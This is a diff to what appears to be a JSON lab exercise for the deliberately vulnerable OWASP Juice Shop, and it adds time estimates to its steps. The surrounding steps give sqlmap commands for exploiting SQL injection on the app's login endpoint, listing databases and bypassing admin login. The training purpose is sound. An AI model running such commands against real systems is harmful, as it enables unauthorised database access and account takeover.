@@ -44,13 +44,15 @@
     {
       "title": "Use SQLMap for automated testing",
       "command": "sqlmap -u 'http://172.20.0.30:3000/rest/user/login' --data='email=test&password=test' --batch",
-      "explanation": "SQLMap can automatically detect and exploit SQL injection. Run this from Kali."
+      "explanation": "SQLMap can automatically detect and exploit SQL injection. Run this from Kali.",
+      "duration": "30-60 sec"
     },
     {
       "title": "Extract database info with SQLMap",
       "command": "sqlmap -u 'http://172.20.0.30:3000/rest/user/login' --data='email=test&password=test' --dbs --batch",
       "explanation": "List all databases.",
-      "expected": "SQLite database detected"
+      "expected": "SQLite database detected",
+      "duration": "1-2 min"
     }
   ],
   "success_criteria": "You logged in as admin without knowing the password. Check the Juice Shop scoreboard for credit.",
